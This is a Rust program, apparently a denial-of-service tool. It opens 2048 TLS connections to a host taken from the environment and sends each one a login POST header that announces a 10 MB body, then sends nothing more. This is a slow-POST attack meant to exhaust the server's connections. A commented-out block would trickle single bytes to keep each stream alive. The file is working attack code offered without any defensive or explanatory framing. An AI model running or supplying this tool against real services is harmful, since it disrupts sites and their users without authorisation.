extern crate futures;
extern crate futures_cpupool;
extern crate native_tls;

extern crate tokio_core;
extern crate tokio_timer;

use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;
use std::thread;
use std::sync::Arc;

use futures::*;
use futures_cpupool::CpuPool;
use tokio_timer::*;

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let timeout = 5;
    let connections_count = 2048;

    let pool = CpuPool::new(2);

    let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", host);
    for connection_number in 0..connections_count {
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
        let mut stream = Box::new(connector.connect(&host, stream).unwrap());
        stream.write(start.as_bytes());
        stream.flush();

//        let timer = Timer::default().interval(Duration::from_secs(timeout)).for_each(move |_| {
//            stream.write(b"a");
//            stream.flush();
//            println!("Stream number: {} written.", connection_number);
//            Ok(())
//        });
//        let task = pool.spawn(timer);
//        println!("Stream number: {} spawned.", connection_number);
    }
}